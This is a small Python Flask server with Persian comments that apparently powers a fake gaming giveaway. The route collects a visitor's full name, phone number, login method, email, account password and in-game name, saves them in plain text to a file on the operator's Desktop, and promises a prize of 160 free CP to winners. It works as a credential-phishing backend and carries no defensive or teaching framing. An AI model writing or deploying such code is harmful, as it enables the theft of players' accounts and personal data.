from flask import Flask, render_template, request
import os
from datetime import datetime

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    # گرفتن اطلاعات فرم
    fullname = request.form.get('fullname')
    phone = request.form.get('phone')
    company = request.form.get('company')
    email = request.form.get('email')
    password = request.form.get('password')
    gamename = request.form.get('gamename')

    # ساخت نام فایل بر اساس ایمیل و زمان
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    safe_email = email.replace('@', '_at_').replace('.', '_')
    filename = f"{safe_email}_{timestamp}.txt"

    # مسیر دسکتاپ (برای ویندوز)
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    file_path = os.path.join(desktop_path, filename)

    # نوشتن اطلاعات در فایل
    with open(file_path, 'w', encoding='utf-8') as f:
        f.write(f"نام کامل: {fullname}\n")
        f.write(f"شماره تلفن: {phone}\n")
        f.write(f"روش اتصال: {company}\n")
        f.write(f"ایمیل: {email}\n")
        f.write(f"رمز عبور: {password}\n")
        f.write(f"نام در بازی: {gamename}\n")

    # پیام موفقیت
    return render_template('index.html', message="فرم شما با موفقیت ثبت گردید. در صورت انتخاب به‌عنوان فرد برنده، هدیه‌ای شامل ۱۶۰ سی‌پی رایگان به شما تعلق خواهد گرفت.")

if __name__ == '__main__':
    app.run()
